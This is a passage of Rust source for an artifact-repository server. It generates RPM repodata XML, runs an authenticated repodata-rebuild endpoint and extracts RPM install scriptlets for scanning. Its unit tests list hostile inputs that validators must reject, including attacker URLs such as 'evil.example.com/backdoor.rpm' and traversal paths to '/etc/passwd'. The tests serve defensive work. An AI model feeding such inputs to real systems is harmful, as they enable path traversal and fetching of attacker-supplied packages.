    let buildhost = info.and_then(|i| i.buildhost.as_deref()).unwrap_or("");
    xml.push_str(&format!(
        "      <rpm:buildhost>{}</rpm:buildhost>\n",
        xml_escape(buildhost)
    ));
    xml.push_str(&format!(
        "      <rpm:sourcerpm>{}</rpm:sourcerpm>\n",
        xml_escape(&source_rpm)
    ));
    if let Some(i) = info {
        xml.push_str(&format!(
            "      <rpm:header-range start=\"{}\" end=\"{}\"/>\n",
            i.header_start, i.header_end
        ));
        push_rpm_entry_list(xml, "rpm:provides", &i.provides);
        push_rpm_entry_list(xml, "rpm:requires", &i.requires);
        push_rpm_entry_list(xml, "rpm:conflicts", &i.conflicts);
        push_rpm_entry_list(xml, "rpm:obsoletes", &i.obsoletes);
        push_rpm_entry_list(xml, "rpm:suggests", &i.suggests);
        push_rpm_entry_list(xml, "rpm:enhances", &i.enhances);
        push_rpm_entry_list(xml, "rpm:recommends", &i.recommends);
        push_rpm_entry_list(xml, "rpm:supplements", &i.supplements);
        // Only "primary" files (`/etc/*`, `*bin/*`, `/usr/lib/sendmail`)
        // go here, as createrepo_c does; the full list is filelists.xml.
        push_rpm_file_list(
            xml,
            "      ",
            i.files
                .iter()
                .filter(|f| crate::formats::rpm::is_primary_file(&f.path)),
        );
    }
    xml.push_str("    </format>\n");
    xml.push_str("  </package>\n");
}

pub(crate) fn generate_filelists_xml(artifacts: &[RpmArtifact]) -> String {
    generate_filelists_xml_with(artifacts, &repodata_infos(artifacts))
}

fn generate_filelists_xml_with(
    artifacts: &[RpmArtifact],
    infos: &[Option<crate::formats::rpm::RpmRepodataInfo>],
) -> String {
    let mut xml = filelists_xml_header(artifacts.len());
    for (artifact, info) in artifacts.iter().zip(infos) {
        push_filelists_package(&mut xml, artifact, info);
    }
    xml.push_str("</filelists>\n");
    xml
}

/// The opening of `filelists.xml` for a document listing `packages` packages.
fn filelists_xml_header(packages: usize) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<filelists xmlns="http://linux.duke.edu/metadata/filelists" packages="{}">
"#,
        packages
    )
}

/// Append one package's `filelists.xml` element. Shared by the whole-slice generator
/// and the streaming render (#4544), so both emit the same bytes.
fn push_filelists_package(
    xml: &mut String,
    artifact: &RpmArtifact,
    info: &Option<crate::formats::rpm::RpmRepodataInfo>,
) {
    let (name, version, release, arch) = if let Some(ref meta) = artifact.metadata {
        (
            meta.get("name")
                .and_then(|v| v.as_str())
                .unwrap_or(&artifact.name)
                .to_string(),
            meta.get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("0")
                .to_string(),
            meta.get("release")
                .and_then(|v| v.as_str())
                .unwrap_or("1")
                .to_string(),
            meta.get("arch")
                .and_then(|v| v.as_str())
                .unwrap_or("noarch")
                .to_string(),
        )
    } else {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        parse_rpm_filename(filename).unwrap_or_else(|| {
            (
                artifact.name.clone(),
                artifact.version.clone().unwrap_or_else(|| "0".to_string()),
                "1".to_string(),
                "noarch".to_string(),
            )
        })
    };

    let info = info.as_ref();
    xml.push_str(&format!(
        r#"  <package pkgid="{checksum}" name="{name}" arch="{arch}">
    <version epoch="{epoch}" ver="{version}" rel="{release}"/>
"#,
        checksum = artifact.checksum_sha256,
        name = xml_escape(&name),
        arch = xml_escape(&arch),
        epoch = info.and_then(|i| i.epoch).unwrap_or(0),
        version = xml_escape(&version),
        release = xml_escape(&release),
    ));
    // The complete file list (#3801), so file requirements outside the
    // primary set (`/usr/share/...`, `/usr/lib64/...`) resolve too.
    if let Some(i) = info {
        push_rpm_file_list(xml, "    ", i.files.iter());
    }
    xml.push_str("  </package>\n");
}

pub(crate) fn generate_other_xml(artifacts: &[RpmArtifact]) -> String {
    generate_other_xml_with(artifacts, &repodata_infos(artifacts))
}

fn generate_other_xml_with(
    artifacts: &[RpmArtifact],
    infos: &[Option<crate::formats::rpm::RpmRepodataInfo>],
) -> String {
    let mut xml = other_xml_header(artifacts.len());
    for (artifact, info) in artifacts.iter().zip(infos) {
        push_other_package(&mut xml, artifact, info);
    }
    xml.push_str("</otherdata>\n");
    xml
}

/// The opening of `other.xml` for a document listing `packages` packages.
fn other_xml_header(packages: usize) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<otherdata xmlns="http://linux.duke.edu/metadata/other" packages="{}">
"#,
        packages
    )
}

/// Append one package's `other.xml` element. Shared by the whole-slice generator
/// and the streaming render (#4544), so both emit the same bytes.
fn push_other_package(
    xml: &mut String,
    artifact: &RpmArtifact,
    info: &Option<crate::formats::rpm::RpmRepodataInfo>,
) {
    let (name, version, release) = if let Some(ref meta) = artifact.metadata {
        (
            meta.get("name")
                .and_then(|v| v.as_str())
                .unwrap_or(&artifact.name)
                .to_string(),
            meta.get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("0")
                .to_string(),
            meta.get("release")
                .and_then(|v| v.as_str())
                .unwrap_or("1")
                .to_string(),
        )
    } else {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        let parsed = parse_rpm_filename(filename);
        (
            parsed
                .as_ref()
                .map(|p| p.0.clone())
                .unwrap_or_else(|| artifact.name.clone()),
            parsed
                .as_ref()
                .map(|p| p.1.clone())
                .unwrap_or_else(|| artifact.version.clone().unwrap_or_else(|| "0".to_string())),
            parsed
                .as_ref()
                .map(|p| p.2.clone())
                .unwrap_or_else(|| "1".to_string()),
        )
    };

    xml.push_str(&format!(
        r#"  <package pkgid="{checksum}" name="{name}" arch="{arch}">
    <version epoch="{epoch}" ver="{version}" rel="{release}"/>
  </package>
"#,
        checksum = artifact.checksum_sha256,
        name = xml_escape(&name),
        arch = xml_escape(
            artifact
                .metadata
                .as_ref()
                .and_then(|m| m.get("arch"))
                .and_then(|v| v.as_str())
                .unwrap_or("noarch")
        ),
        epoch = info.as_ref().and_then(|i| i.epoch).unwrap_or(0),
        version = xml_escape(&version),
        release = xml_escape(&release),
    ));
}

/// The header-derived repodata block recorded for `artifact` at upload (or
/// healed since — see [`heal_rpm_repodata_info`]). `None` when absent or not
/// in the current shape.
fn rpm_repodata_info(artifact: &RpmArtifact) -> Option<crate::formats::rpm::RpmRepodataInfo> {
    let value = artifact.metadata.as_ref()?.get(RPM_REPODATA_KEY)?;
    if value.get("v").and_then(|v| v.as_u64()) != Some(RPM_REPODATA_INFO_VERSION)
        || value.get("unparseable").is_some()
    {
        return None;
    }
    // Deserialize from the borrowed value: cloning a package's block first
    // doubled its footprint for the length of the render (#4544).
    <crate::formats::rpm::RpmRepodataInfo as serde::Deserialize>::deserialize(value).ok()
}

/// Serialize one `<rpm:provides>`/`<rpm:requires>`/... list in
/// createrepo_c's element format (`<rpm:entry name flags epoch ver rel
/// pre/>`, attributes present only when set). Omitted entirely when empty.
/// Shared with the RPM publication serializer.
pub(crate) fn push_rpm_entry_list(
    xml: &mut String,
    tag: &str,
    entries: &[crate::services::curation_sync::RpmEntry],
) {
    if entries.is_empty() {
        return;
    }
    xml.push_str(&format!("      <{tag}>\n"));
    for e in entries {
        xml.push_str(&format!(
            "        <rpm:entry name=\"{}\"",
            xml_escape(&e.name)
        ));
        for (attr, value) in [
            ("flags", &e.flags),
            ("epoch", &e.epoch),
            ("ver", &e.ver),
            ("rel", &e.rel),
            ("pre", &e.pre),
        ] {
            if let Some(v) = value {
                xml.push_str(&format!(" {attr}=\"{}\"", xml_escape(v)));
            }
        }
        xml.push_str("/>\n");
    }
    xml.push_str(&format!("      </{tag}>\n"));
}

/// Serialize `<file>` elements (`type="dir"`/`type="ghost"` when typed).
fn push_rpm_file_list<'a>(
    xml: &mut String,
    indent: &str,
    files: impl Iterator<Item = &'a crate::services::curation_sync::RpmFileEntry>,
) {
    for file in files {
        match &file.kind {
            Some(k) => xml.push_str(&format!(
                "{indent}<file type=\"{}\">{}</file>\n",
                xml_escape(k),
                xml_escape(&file.path)
            )),
            None => xml.push_str(&format!(
                "{indent}<file>{}</file>\n",
                xml_escape(&file.path)
            )),
        }
    }
}

fn generate_updateinfo_xml() -> String {
    r#"<?xml version="1.0" encoding="UTF-8"?>
<updates></updates>
"#
    .to_string()
}

// ---------------------------------------------------------------------------
// POST /api/v1/repositories/{key}/rpm/repodata/rebuild (#4544)
// ---------------------------------------------------------------------------

/// Routes mounted on the `/api/v1/repositories` nest.
pub fn repo_router() -> Router<SharedState> {
    Router::new().route("/:key/rpm/repodata/rebuild", post(rebuild_repodata))
}

/// Longest a `wait=true` rebuild waits for a build another replica is
/// running before it builds the root itself.
const REBUILD_WAIT: std::time::Duration = std::time::Duration::from_secs(300);

/// Synchronous (`wait=true`) builds one replica runs at once; more answer
/// 503 rather than queue connections and render work.
static REBUILD_SLOTS: tokio::sync::Semaphore = tokio::sync::Semaphore::const_new(2);

/// Query of `POST .../rpm/repodata/rebuild`.
#[derive(Debug, serde::Deserialize, utoipa::IntoParams)]
pub struct RebuildRepodataQuery {
    /// Metadata root, as it appears in the repository URL (`el9/x86_64` at
    /// depth two). Omit at depth zero.
    #[serde(default)]
    pub root: String,
    /// Build now and answer once the root is built (`200`), instead of
    /// asking the background builder to build it at its next tick (`202`).
    #[serde(default)]
    pub wait: bool,
}

/// Outcome of a repodata rebuild request.
#[derive(Debug, Clone, Copy, serde::Serialize, utoipa::ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum RebuildStatus {
    /// A revision including every earlier write is being served.
    Built,
    /// The root has no packages left; it renders an empty document.
    Empty,
    /// Without `wait`: the builder builds the root at its next tick.
    Queued,
}

/// Result of a repodata rebuild request.
#[derive(Debug, serde::Serialize, utoipa::ToSchema)]
pub struct RebuildRepodataResponse {
    /// The metadata root (empty at depth zero).
    pub root: String,
    pub status: RebuildStatus,
    /// The revision now served, when `status` is `built`.
    #[serde(skip_serializing_if = "Option::is_none")]
    #[schema(nullable = false)]
    pub revision: Option<i64>,
    /// Packages the revision lists, when `status` is `built`.
    #[serde(skip_serializing_if = "Option::is_none")]
    #[schema(nullable = false)]
    pub packages: Option<i64>,
}

/// Rebuild the precomputed repodata of a hosted RPM root
///
/// Hosted RPM repositories serve repodata built in the background after a
/// short debounce, so right after a publish a root can still describe the
/// previous state. A CI job that publishes and then installs from the same
/// root calls this with `wait=true`: it answers once a revision that
/// includes every write committed before the call is being served (callers
/// arriving together share one build). Without `wait` the build is only
/// requested. Needs the repository `write` permission, like an upload.
#[utoipa::path(
    post,
    path = "/{key}/rpm/repodata/rebuild",
    context_path = "/api/v1/repositories",
    tag = "repositories",
    params(
        ("key" = String, Path, description = "Repository key"),
        RebuildRepodataQuery,
    ),
    security(("bearer_auth" = [])),
    responses(
        (status = 200, description = "Root built (or empty)", body = RebuildRepodataResponse),
        (status = 202, description = "Build requested", body = RebuildRepodataResponse),
        (status = 400, description = "`root` is not a metadata root at the repository's depth"),
        (status = 401, description = "Authentication required"),
        (status = 403, description = "Repository write permission required"),
        (status = 404, description = "Repository not found, or no packages under `root`"),
        (status = 409, description = "The repository renders repodata on request (`repodata_mode: on_request`), serves a curated publication or is being deleted; or a build or a long write on the root did not finish in time"),
        (status = 422, description = "Not a hosted (local) RPM repository"),
        (status = 503, description = "This replica is already running its maximum of synchronous rebuilds; retry"),
    )
)]
pub async fn rebuild_repodata(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    Path(key): Path<String>,
    axum::extract::Query(query): axum::extract::Query<RebuildRepodataQuery>,
) -> crate::error::Result<Response> {
    use crate::error::AppError;
    use crate::services::repository_service::RepositoryService;
    use rpm_repodata_builder::{BuildOutcome, RepodataMode};

    let auth = auth.ok_or_else(|| AppError::Authentication("Authentication required".into()))?;
    auth.require_scope("write:repositories")?;
    let service = RepositoryService::new(state.db.clone());
    let repo = service.get_by_key(&key).await?;
    crate::api::handlers::repositories::require_repo_write_access(&auth, &repo, &service).await?;
    crate::api::handlers::repositories::require_repo_action(
        &auth,
        repo.id,
        "write",
        &state.permission_service,
    )
    .await?;
    if repo.format != RepositoryFormat::Rpm || repo.repo_type != RepositoryType::Local {
        return Err(AppError::UnprocessableEntity(
            "Repodata rebuilds apply to hosted (local) RPM repositories only".into(),
        ));
    }
    if rpm_repodata_builder::mode(&state.db, repo.id).await? == RepodataMode::OnRequest {
        return Err(AppError::Conflict(
            "This repository renders repodata on every request (repodata_mode: on_request); \
             there is nothing to rebuild"
                .into(),
        ));
    }
    if rpm_repodata_builder::precomputed_location(&state.db, repo.id)
        .await?
        .is_none()
    {
        return Err(AppError::Conflict(
            "This repository's repodata is not precomputed (it serves a curated publication \
             or is being deleted)"
                .into(),
        ));
    }
    let root = query.root.trim_matches('/').to_string();
    let depth = rpm_layout::depth(&state.db, repo.id).await?;
    rpm_layout::validate_root(&root, depth).map_err(|_| {
        AppError::Validation(format!(
            "'{root}' is not a metadata root of this repository (repodata_depth {depth})"
        ))
    })?;
    if !rpm_repodata_builder::root_has_packages(&state.db, repo.id, &root).await? {
        return Err(AppError::NotFound(format!(
            "No packages under root '{root}'"
        )));
    }

    if !query.wait {
        rpm_repodata_builder::request_build(&state.db, repo.id, &root).await?;
        let body = RebuildRepodataResponse {
            root,
            status: RebuildStatus::Queued,
            revision: None,
            packages: None,
        };
        return Ok((StatusCode::ACCEPTED, axum::Json(body)).into_response());
    }
    let permit = REBUILD_SLOTS.try_acquire().map_err(|_| {
        AppError::ServiceUnavailable(
            "Too many synchronous repodata rebuilds in progress; retry".into(),
        )
    })?;
    // In its own task: a client that disconnects must not cancel a build
    // half way, after it cleared the root's dirty flag.
    let task_state = state.clone();
    let (repo_id, task_root) = (repo.id, root.clone());
    let outcome = tokio::spawn(async move {
        let _permit = permit;
        rpm_repodata_builder::build_waiting(&task_state, repo_id, &task_root, REBUILD_WAIT).await
    })
    .await
    .map_err(|e| AppError::Internal(format!("repodata rebuild task failed: {e}")))??;
    let (status, revision, packages) = match outcome {
        BuildOutcome::Built { revision, packages } => {
            (RebuildStatus::Built, Some(revision), Some(packages))
        }
        BuildOutcome::Empty => (RebuildStatus::Empty, None, None),
        BuildOutcome::Busy => {
            return Err(AppError::Conflict(
                "Another build of this root did not finish in time; retry".into(),
            ))
        }
        BuildOutcome::WritersBusy => {
            return Err(AppError::Conflict(
                "A long-running write to this root is still in progress; retry".into(),
            ))
        }
        BuildOutcome::NotPrecomputed => {
            return Err(AppError::Conflict(
                "This repository's repodata is not precomputed".into(),
            ))
        }
    };
    let body = RebuildRepodataResponse {
        root,
        status,
        revision,
        packages,
    };
    Ok((StatusCode::OK, axum::Json(body)).into_response())
}

#[derive(utoipa::OpenApi)]
#[openapi(
    paths(rebuild_repodata),
    components(schemas(RebuildRepodataResponse, RebuildStatus))
)]
pub struct RpmRepodataApiDoc;

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

pub(crate) fn sha256_hex(data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(data);
    format!("{:x}", hasher.finalize())
}

pub(crate) fn gzip_bytes(data: &[u8]) -> Vec<u8> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(data).expect("gzip write failed");
    encoder.finish().expect("gzip finish failed")
}

/// Escape `s` for an XML 1.0 text node or attribute value. Characters XML
/// 1.0 cannot represent at all (C0 controls other than tab/LF/CR, U+FFFE,
/// U+FFFF) are dropped: uploads carrying them are refused (#3801), but rows
/// stored earlier must still never make a whole document ill-formed.
pub(crate) fn xml_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&apos;"),
            c if is_forbidden_xml_control(c) => {}
            c => out.push(c),
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Scriptlet analysis (#4033)
// ---------------------------------------------------------------------------

/// True when `prog` is a POSIX-style shell, i.e. an interpreter the shell
/// rule set in [`crate::services::conda_scripts`] actually describes.
///
/// RPM's `%post -p /usr/bin/python3` and Debian's `#!/usr/bin/perl` are both
/// legal, and shell rules run over Python or Perl are wrong in both
/// directions — they miss `os.system(...)` and fire on `print("| sh")`. A
/// script under any other interpreter is therefore reported as un-analysed
/// rather than scanned. The check keys on the basename of the first token so
/// `/bin/sh -e` and `/usr/bin/env bash` both count.
pub(crate) fn is_shell_interpreter(prog: &str) -> bool {
    let mut tokens = prog.split_whitespace();
    let mut program = tokens.next().unwrap_or("");
    if program.rsplit('/').next() == Some("env") {
        program = tokens.next().unwrap_or("");
    }
    matches!(
        program.rsplit('/').next().unwrap_or(""),
        "sh" | "bash" | "dash" | "ash" | "ksh" | "mksh" | "zsh"
    )
}

/// Extract the `%pre`/`%post`/`%preun`/`%postun` scriptlets from an RPM.
///
/// Reuses [`RpmHandler::parse_rpm_header`] — the same parse that feeds
/// `primary.xml` — rather than walking the header a second time. The header
/// carries each scriptlet as a `STRING` tag with a sibling `*PROG` tag naming
/// its interpreter, so the `location` names the tag it came from
/// (`rpm:header#POSTIN`), not an invented file path.
///
/// Never fails. A file the parser rejects is `NotRead`. So is one where the
/// parser fell back to the lead alone: `parse_rpm_header` does that silently
/// when no main header follows the signature, and the tell is an empty
/// `version` — `RPMTAG_VERSION` is mandatory, so a header that was actually
/// read never leaves it blank. Without this check a headerless file would
/// record `Complete` with no scripts, which is the exact defect #4035/#4036
/// exist to remove.
///
/// A scriptlet under a non-shell interpreter (see [`is_shell_interpreter`])
/// is returned in the second list, un-analysed, with a sentence saying why:
/// it exists and runs as root, so its body is stored, but shell rules over
/// Lua would be wrong in both directions. The package stays `Complete` —
/// every byte was read; declining to judge one script is a fact carried by
/// that script's own row, and `Partial` is reserved for bytes we could not
/// read. A scriptlet with an interpreter but no body (`%post -p
/// /sbin/ldconfig`) still runs that program as root, so it is recorded with
/// the program as its body under `rpm:header#POSTINPROG`; a bodiless default
/// shell is a no-op and is not.
pub(crate) type ExtractedScripts = (Vec<InstallScript>, Vec<UnanalyzedScript>, Completeness);

pub(crate) fn extract_rpm_scriptlets(content: &[u8]) -> ExtractedScripts {
    let not_read = |reason: String| (Vec::new(), Vec::new(), Completeness::NotRead { reason });
    let header = match RpmHandler::parse_rpm_header(content) {
        Ok(header) => header,
        Err(e) => return not_read(format!("RPM header could not be parsed: {e}")),
    };
    if header.version.is_empty() {
        return not_read("RPM main header not found; only the lead was read".to_string());
    }

    let slots = [
        (
            ScriptKind::RpmPre,
            "PREIN",
            &header.pre_install,
            &header.pre_install_prog,
        ),
        (
            ScriptKind::RpmPost,
            "POSTIN",
            &header.post_install,
            &header.post_install_prog,
        ),
        (
            ScriptKind::RpmPreUn,
            "PREUN",
            &header.pre_uninstall,
            &header.pre_uninstall_prog,
        ),
        (
            ScriptKind::RpmPostUn,
            "POSTUN",
            &header.post_uninstall,
            &header.post_uninstall_prog,
        ),
    ];
    let mut scripts = Vec::new();
    let mut unanalyzed = Vec::new();
    for (kind, tag, body, prog) in slots {
        let prog = prog.as_deref().map(str::trim).unwrap_or("");
        match body.as_deref() {
            Some(body) => {
                let script = make_inline_script(kind, &format!("rpm:header#{tag}"), body);
                if prog.is_empty() || is_shell_interpreter(prog) {
                    scripts.push(script);
                } else {
                    // The header parser hands the body over already decoded,
                    // so its length is the closest thing to the on-disk size.
                    unanalyzed.push(UnanalyzedScript {
                        original_size_bytes: body.len() as i64,
                        script,
                        reason: format!(
                            "{tag} runs under {prog}, which the shell rules do not cover"
                        ),
                    });
                }
            }
            None if !prog.is_empty() && !is_shell_interpreter(prog) => {
                scripts.push(make_inline_script(
                    kind,
                    &format!("rpm:header#{tag}PROG"),
                    prog,
                ));
            }
            None => {}
        }
    }
    (scripts, unanalyzed, Completeness::Complete)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[allow(clippy::disallowed_methods)]
// streaming-invariant: test module exempt — buffering response bodies in test assertions is not an artifact path (#1608)
#[cfg(ak_test_shard = "handlers-2")]
#[cfg(test)]
mod tests {
    use super::*;
    use axum::http::HeaderValue;
    use pgp::composed::{Deserializable, SignedPublicKey, StandaloneSignature};

    use crate::services::signing_service::{verify_detached, CreateKeyRequest};

    // -- #2358 @N publication-serving pure helpers ---------------------------

    // The stored upstream href is attacker-influenced. Only a plain relative
    // path under the curation upstream may ever be fetched.
    #[test]
    fn test_is_safe_upstream_rel_path_rejects_hostile_hrefs() {
        // Legit relative upstream paths.
        assert!(is_safe_upstream_rel_path(
            "Packages/nginx-1.24.0-1.el9.x86_64.rpm"
        ));
        assert!(is_safe_upstream_rel_path("nginx.rpm"));
        assert!(is_safe_upstream_rel_path("el/9/x86_64/n/nginx.rpm"));

        // The injection vectors: absolute attacker URL, absolute path,
        // traversal, backslash, empty.
        assert!(!is_safe_upstream_rel_path(
            "https://evil.example.com/backdoor.rpm"
        ));
        assert!(!is_safe_upstream_rel_path("http://evil/backdoor.rpm"));
        assert!(!is_safe_upstream_rel_path("//evil/backdoor.rpm"));
        assert!(!is_safe_upstream_rel_path("/etc/passwd"));
        assert!(!is_safe_upstream_rel_path("../../etc/passwd"));
        assert!(!is_safe_upstream_rel_path("Packages/../../../etc/passwd"));
        assert!(!is_safe_upstream_rel_path("Packages\\evil.rpm"));
        assert!(!is_safe_upstream_rel_path(""));
    }

    #[test]
    fn test_split_publication_prefix() {
        assert_eq!(
            split_publication_prefix("@3/repodata/repomd.xml"),
            Some((3, "repodata/repomd.xml".to_string()))
        );
        assert_eq!(split_publication_prefix("@42"), Some((42, String::new())));
        // No leading @N -> None (normal proxy path).
        assert_eq!(split_publication_prefix("repodata/repomd.xml"), None);
        assert_eq!(split_publication_prefix("Packages/foo.rpm"), None);
        // `@` not followed by digits -> None.
        assert_eq!(split_publication_prefix("@latest/x"), None);
        assert_eq!(split_publication_prefix("@/x"), None);
        // An email-like package name is not mistaken for a version.
        assert_eq!(split_publication_prefix("@1.2/x"), None);
    }

    #[test]
    fn test_sanitize_publication_subpath_rejects_traversal() {
        assert!(sanitize_publication_subpath("repodata/repomd.xml").is_ok());
        assert!(sanitize_publication_subpath("Packages/tree.rpm").is_ok());
        // Traversal / absolute / empty / dot / backslash / double-slash all 404.
        for bad in [
            "",
            "/etc/passwd",
            "../secret",
            "repodata/../../etc/passwd",
            "a//b",
            "a/./b",
            "a\\b",
            "..",
        ] {
            assert!(
                sanitize_publication_subpath(bad).is_err(),
                "must reject {bad:?}"
            );
        }
    }

    #[test]
    fn test_publication_content_type() {
        assert_eq!(
            publication_content_type("repodata/primary.xml.gz"),
            "application/gzip"
        );
        assert_eq!(
            publication_content_type("repodata/repomd.xml.asc"),
            "application/pgp-signature"
        );
        assert_eq!(
            publication_content_type("repodata/repomd.xml.key"),
            "application/pgp-keys"
        );
        assert_eq!(
            publication_content_type("repodata/repomd.xml"),
            "application/xml"
        );
        assert_eq!(
            publication_content_type("Packages/tree.rpm"),
            "application/octet-stream"
        );
    }

    // -----------------------------------------------------------------------
    // parse_rpm_filename
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_rpm_filename_standard() {
        let result = parse_rpm_filename("my-package-1.0.0-1.x86_64.rpm");
        assert_eq!(
            result,
            Some((
                "my-package".to_string(),
                "1.0.0".to_string(),
                "1".to_string(),
                "x86_64".to_string()
            ))
        );
    }

    #[test]
    fn test_parse_rpm_filename_with_el() {
        let result = parse_rpm_filename("hello-2.10-1.el8.noarch.rpm");
        assert_eq!(
            result,
            Some((
                "hello".to_string(),
                "2.10".to_string(),
                "1.el8".to_string(),
                "noarch".to_string()
            ))
        );
    }

    #[test]
    fn test_parse_rpm_filename_complex_name() {
        let result = parse_rpm_filename("my-cool-app-3.2.1-2.fc38.aarch64.rpm");
        assert_eq!(
            result,
            Some((
                "my-cool-app".to_string(),
                "3.2.1".to_string(),
                "2.fc38".to_string(),
                "aarch64".to_string()
            ))
        );
    }

    #[test]
    fn test_parse_rpm_filename_invalid() {
        assert_eq!(parse_rpm_filename("notanrpm.txt"), None);
        assert_eq!(parse_rpm_filename("bad.rpm"), None);
        assert_eq!(parse_rpm_filename(""), None);
    }

    #[test]
    fn test_parse_rpm_filename_src_rpm() {
        // Source RPMs still have .rpm extension in this parser
        let result = parse_rpm_filename("kernel-5.14.0-284.el9.src.rpm");
        assert!(result.is_some());
        let (name, version, release, arch) = result.unwrap();
        assert_eq!(name, "kernel");
        assert_eq!(version, "5.14.0");
        assert_eq!(release, "284.el9");
        assert_eq!(arch, "src");
    }

    #[test]
    fn test_parse_rpm_filename_single_char_name() {
        let result = parse_rpm_filename("a-1.0-1.x86_64.rpm");
        assert!(result.is_some());
        assert_eq!(result.unwrap().0, "a");
    }

    // -----------------------------------------------------------------------
    // xml_escape
    // -----------------------------------------------------------------------

    #[test]
    fn test_xml_escape_all_entities() {
        assert_eq!(
            xml_escape("a<b>c&d\"e'f"),
            "a&lt;b&gt;c&amp;d&quot;e&apos;f"
        );
    }

    #[test]
    fn test_xml_escape_no_special_chars() {
        assert_eq!(xml_escape("hello world"), "hello world");
    }

    #[test]
    fn test_xml_escape_empty_string() {
        assert_eq!(xml_escape(""), "");
    }

    #[test]
    fn test_xml_escape_ampersand_first() {
        // Verify & is escaped before other entities to avoid double-escaping
        assert_eq!(xml_escape("&"), "&amp;");
        assert_eq!(xml_escape("&&"), "&amp;&amp;");
    }

    #[test]
    fn test_xml_escape_all_ampersands() {
        assert_eq!(xml_escape("a&b&c"), "a&amp;b&amp;c");
    }

    // -----------------------------------------------------------------------
    // sha256_hex
    // -----------------------------------------------------------------------

    #[test]
    fn test_sha256_hex_known_value() {
        let hash = sha256_hex(b"hello");
        assert_eq!(
            hash,
            "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"
        );
    }

    #[test]
    fn test_sha256_hex_empty() {
        let hash = sha256_hex(b"");
        assert_eq!(
            hash,
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn test_sha256_hex_length() {
        let hash = sha256_hex(b"anything");
        assert_eq!(hash.len(), 64);
        assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn test_sha256_hex_deterministic() {
        let h1 = sha256_hex(b"test");
        let h2 = sha256_hex(b"test");
        assert_eq!(h1, h2);
    }

    // -----------------------------------------------------------------------
    // gzip_bytes
    // -----------------------------------------------------------------------

    #[test]
    fn test_gzip_roundtrip() {
        let original = b"test data for gzip";
        let compressed = gzip_bytes(original);
        assert!(!compressed.is_empty());
        assert_ne!(compressed, original);

        // Decompress and verify
        use flate2::read::GzDecoder;
        use std::io::Read;
        let mut decoder = GzDecoder::new(&compressed[..]);
        let mut decompressed = String::new();
        decoder.read_to_string(&mut decompressed).unwrap();
        assert_eq!(decompressed.as_bytes(), original);
    }

    #[test]
    fn test_gzip_bytes_empty_input() {
        let compressed = gzip_bytes(b"");
        assert!(!compressed.is_empty()); // gzip header still present
    }

    #[test]
    fn test_gzip_bytes_starts_with_gzip_magic() {
        let compressed = gzip_bytes(b"hello");
        assert!(compressed.len() >= 2);
        assert_eq!(compressed[0], 0x1f);
        assert_eq!(compressed[1], 0x8b);
    }

    // -----------------------------------------------------------------------
    // build_rpm_artifact_path
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_rpm_artifact_path_basic() {
        assert_eq!(
            build_rpm_artifact_path("my-package-1.0.0-1.x86_64.rpm"),
            "packages/my-package-1.0.0-1.x86_64.rpm"
        );
    }

    #[test]
    fn test_build_rpm_artifact_path_simple() {
        assert_eq!(build_rpm_artifact_path("hello.rpm"), "packages/hello.rpm");
    }

    #[test]
    fn test_build_rpm_artifact_path_complex() {
        assert_eq!(
            build_rpm_artifact_path("glibc-2.34-60.el9.aarch64.rpm"),
            "packages/glibc-2.34-60.el9.aarch64.rpm"
        );
    }

    // -----------------------------------------------------------------------
    // build_rpm_storage_key
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_rpm_storage_key_basic() {
        let id = uuid::Uuid::parse_str("00000000-0000-0000-0000-000000000001").unwrap();
        assert_eq!(
            build_rpm_storage_key(&id, "pkg-1.0-1.x86_64.rpm"),
            "rpm/00000000-0000-0000-0000-000000000001/pkg-1.0-1.x86_64.rpm"
        );
    }

    #[test]
    fn test_build_rpm_storage_key_different_uuid() {
        let id = uuid::Uuid::new_v4();
        let key = build_rpm_storage_key(&id, "test.rpm");
        assert!(key.starts_with("rpm/"));
        assert!(key.ends_with("/test.rpm"));
        assert!(key.contains(&id.to_string()));
    }

    // -----------------------------------------------------------------------
    // build_rpm_full_version
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_rpm_full_version_basic() {
        assert_eq!(build_rpm_full_version("1.0.0", "1"), "1.0.0-1");
    }

    #[test]
    fn test_build_rpm_full_version_with_el() {
        assert_eq!(build_rpm_full_version("2.10", "1.el8"), "2.10-1.el8");
    }

    #[test]
    fn test_build_rpm_full_version_complex() {
        assert_eq!(
            build_rpm_full_version("5.14.0", "284.30.1.el9_2"),
            "5.14.0-284.30.1.el9_2"
        );
    }

    // -----------------------------------------------------------------------
    // build_rpm_metadata
    // -----------------------------------------------------------------------

    #[test]
    fn test_build_rpm_metadata_all_fields() {
        let meta = build_rpm_metadata("my-pkg", "1.0", "1", "x86_64", "my-pkg-1.0-1.x86_64.rpm");
        assert_eq!(meta["name"], "my-pkg");
        assert_eq!(meta["version"], "1.0");
        assert_eq!(meta["release"], "1");
        assert_eq!(meta["arch"], "x86_64");
        assert_eq!(meta["filename"], "my-pkg-1.0-1.x86_64.rpm");
    }

    #[test]
    fn test_build_rpm_metadata_noarch() {
        let meta = build_rpm_metadata(
            "python-six",
            "1.16.0",
            "1.el9",
            "noarch",
            "python-six-1.16.0-1.el9.noarch.rpm",
